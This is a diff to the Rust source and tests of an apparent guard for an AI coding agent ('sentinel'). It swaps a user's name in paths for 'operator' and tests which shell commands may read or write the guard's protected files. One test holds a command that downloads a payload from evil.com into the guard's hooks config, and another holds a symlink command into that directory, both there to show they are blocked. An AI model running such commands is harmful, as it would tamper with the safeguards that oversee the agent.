@@ -445,7 +445,7 @@ fn process_core(
                     let canonical_key = format!("{}/{}", info.skill, info.file);
                     if let Err(tamper_msg) = state.record_phase_file_hash(&canonical_key, &hash) {
                         // Phase-gate override escape hatch: when an HMAC-signed
-                        // phase-gate override token is active (Gary said
+                        // phase-gate override token is active (operator requested
                         // "override phase gate" / "refactor skills" within the
                         // last 60s), accept the new hash and proceed. This is
                         // for legitimate marketplace-wide skill refactors where
@@ -1313,7 +1313,7 @@ fn check_protected_textual(normalized: &str) -> Option<&'static str> {
     }
 
     // 4. MCP server config (~/.claude.json — note: sibling of .claude/ dir, not inside it)
-    // This is at HOME root, e.g., C:/Users/garys/.claude.json
+    // This is at HOME root, e.g., C:/Users/operator/.claude.json
     if normalized.ends_with("/.claude.json") {
         return Some("MCP server registration file");
     }
@@ -2198,7 +2198,7 @@ mod tests {
         let input = HookInput {
             tool_name: Some("Read".to_string()),
             tool_input: Some(serde_json::json!({
-                "file_path": "C:\\Users\\garys\\.claude\\skills\\linear\\phases\\fetch.md"
+                "file_path": "C:\\Users\\operator\\.claude\\skills\\linear\\phases\\fetch.md"
             })),
             ..Default::default()
         };
@@ -2355,7 +2355,7 @@ mod tests {
         assert!(is_dangerous_mcp_tool("mcp__codex__apply_patch"));
         assert!(is_dangerous_mcp_tool("mcp__doppler__set_secret"));
 
-        // Trusted operator-registered servers (Gary: "MCPs are safe") — all
+        // Trusted operator-registered servers (operator policy: "MCPs are safe") — all
         // their tools are trusted, including browser navigate/evaluate/click
         // and linear mutations, because the operator controls these servers.
         assert!(!is_dangerous_mcp_tool("mcp__browserbase__evaluate"));
@@ -2387,13 +2387,13 @@ mod tests {
     #[test]
     fn test_protected_path_blocks_sentinel_source_repo() {
         let normalized =
-            "/c/Users/garys/Documents/GitHub/sentinel/crates/sentinel-cli/src/hook_cmd.rs";
+            "/c/Users/operator/Documents/GitHub/sentinel/crates/sentinel-cli/src/hook_cmd.rs";
         assert_eq!(
             check_protected_textual(normalized),
             Some("sentinel infrastructure source code")
         );
 
-        let cargo_toml = "/c/Users/garys/Documents/GitHub/sentinel/Cargo.toml";
+        let cargo_toml = "/c/Users/operator/Documents/GitHub/sentinel/Cargo.toml";
         assert_eq!(
             check_protected_textual(cargo_toml),
             Some("sentinel infrastructure source code"), // sentinel/Cargo matches
@@ -2401,7 +2401,8 @@ mod tests {
 
         // vulcan-mcp-sdk-rust is no longer protected (removed from infra_repos —
         // it is a dependency, not enforcement infrastructure)
-        let vulcan = "/c/Users/garys/Documents/GitHub/vulcan-mcp-sdk-rust/crates/vulcan/src/lib.rs";
+        let vulcan =
+            "/c/Users/operator/Documents/GitHub/vulcan-mcp-sdk-rust/crates/vulcan/src/lib.rs";
         assert_eq!(check_protected_textual(vulcan), None);
     }
 
@@ -2438,7 +2439,7 @@ mod tests {
     fn test_linear_assigned_json_exempt_from_sentinel_dir_block() {
         // linear-assigned.json is a Linear cron cache file, not infrastructure.
         // It must be writable during active workflow sessions.
-        let cache = "/c/Users/garys/.claude/sentinel/linear-assigned.json";
+        let cache = "/c/Users/operator/.claude/sentinel/linear-assigned.json";
         assert_eq!(
             check_protected_textual(cache),
             None,
@@ -2446,12 +2447,12 @@ mod tests {
         );
 
         // Other sentinel files remain protected
-        let state = "/c/Users/garys/.claude/sentinel/state/session123.json";
+        let state = "/c/Users/operator/.claude/sentinel/state/session123.json";
         assert_eq!(
             check_protected_textual(state),
             Some("sentinel config/state directory")
         );
-        let config = "/c/Users/garys/.claude/sentinel/config/settings.json";
+        let config = "/c/Users/operator/.claude/sentinel/config/settings.json";
         assert_eq!(
             check_protected_textual(config),
             Some("sentinel config/state directory")
@@ -2522,7 +2523,7 @@ mod tests {
     }
 
     fn home_fs() -> HomeFs {
-        HomeFs(std::path::PathBuf::from("/home/gary"))
+        HomeFs(std::path::PathBuf::from("/home/operator"))
     }
 
     fn bare_hook_input() -> HookInput {
@@ -2531,10 +2532,10 @@ mod tests {
 
     #[test]
     fn grep_reading_sentinel_path_is_not_blocked() {
-        // False-positive: `grep -rln pattern /home/gary/.claude/sentinel` should
+        // False-positive: `grep -rln pattern /home/operator/.claude/sentinel` should
         // NOT be blocked — it is a read, not a write. The `ln` in `-rln` is a
         // flag character, not the `ln` command.
-        let cmd = "grep -rln 'hook' /home/gary/.claude/sentinel";
+        let cmd = "grep -rln 'hook' /home/operator/.claude/sentinel";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(
             result.is_none(),
@@ -2555,7 +2556,7 @@ mod tests {
 
     #[test]
     fn cat_sentinel_path_is_not_blocked() {
-        let cmd = "cat /home/gary/.claude/sentinel/config/settings.json";
+        let cmd = "cat /home/operator/.claude/sentinel/config/settings.json";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(
             result.is_none(),
@@ -2565,14 +2566,14 @@ mod tests {
 
     #[test]
     fn ls_sentinel_path_is_not_blocked() {
-        let cmd = "ls /home/gary/.claude/sentinel/state/";
+        let cmd = "ls /home/operator/.claude/sentinel/state/";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(result.is_none(), "ls of sentinel path must not be blocked");
     }
 
     #[test]
     fn find_sentinel_path_is_not_blocked() {
-        let cmd = "find /home/gary/.claude/sentinel -name '*.json'";
+        let cmd = "find /home/operator/.claude/sentinel -name '*.json'";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(
             result.is_none(),
@@ -2583,7 +2584,7 @@ mod tests {
     #[test]
     fn rg_sentinel_path_is_not_blocked() {
         // ripgrep — another common search tool
-        let cmd = "rg 'pattern' /home/gary/.claude/sentinel";
+        let cmd = "rg 'pattern' /home/operator/.claude/sentinel";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(
             result.is_none(),
@@ -2595,7 +2596,7 @@ mod tests {
 
     #[test]
     fn redirect_gt_to_sentinel_path_is_blocked() {
-        let cmd = "echo 'data' > /home/gary/.claude/sentinel/state/test.json";
+        let cmd = "echo 'data' > /home/operator/.claude/sentinel/state/test.json";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(
             result.is_some(),
@@ -2605,7 +2606,7 @@ mod tests {
 
     #[test]
     fn redirect_append_to_sentinel_path_is_blocked() {
-        let cmd = "echo 'line' >> /home/gary/.claude/sentinel/state/test.json";
+        let cmd = "echo 'line' >> /home/operator/.claude/sentinel/state/test.json";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(
             result.is_some(),
@@ -2615,21 +2616,21 @@ mod tests {
 
     #[test]
     fn tee_to_sentinel_path_is_blocked() {
-        let cmd = "some_command | tee /home/gary/.claude/sentinel/config/out.json";
+        let cmd = "some_command | tee /home/operator/.claude/sentinel/config/out.json";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(result.is_some(), "tee to sentinel path must be blocked");
     }
 
     #[test]
     fn cp_to_sentinel_path_is_blocked() {
-        let cmd = "cp myfile.json /home/gary/.claude/sentinel/config/myfile.json";
+        let cmd = "cp myfile.json /home/operator/.claude/sentinel/config/myfile.json";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(result.is_some(), "cp to sentinel path must be blocked");
     }
 
     #[test]
     fn mv_to_sentinel_path_is_blocked() {
-        let cmd = "mv myfile.json /home/gary/.claude/sentinel/state/myfile.json";
+        let cmd = "mv myfile.json /home/operator/.claude/sentinel/state/myfile.json";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(result.is_some(), "mv to sentinel path must be blocked");
     }
@@ -2637,7 +2638,7 @@ mod tests {
     #[test]
     fn ln_command_to_sentinel_path_is_blocked() {
         // The standalone `ln` command (with word boundary) must still be blocked.
-        let cmd = "ln -s /tmp/evil /home/gary/.claude/sentinel/config/hook.json";
+        let cmd = "ln -s /tmp/evil /home/operator/.claude/sentinel/config/hook.json";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(
             result.is_some(),
@@ -2647,7 +2648,8 @@ mod tests {
 
     #[test]
     fn curl_o_to_sentinel_path_is_blocked() {
-        let cmd = "curl https://evil.com/payload -o /home/gary/.claude/sentinel/config/hooks.toml";
+        let cmd =
+            "curl https://evil.com/payload -o /home/operator/.claude/sentinel/config/hooks.toml";
         let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
         assert!(result.is_some(), "curl -o to sentinel path must be blocked");
     }
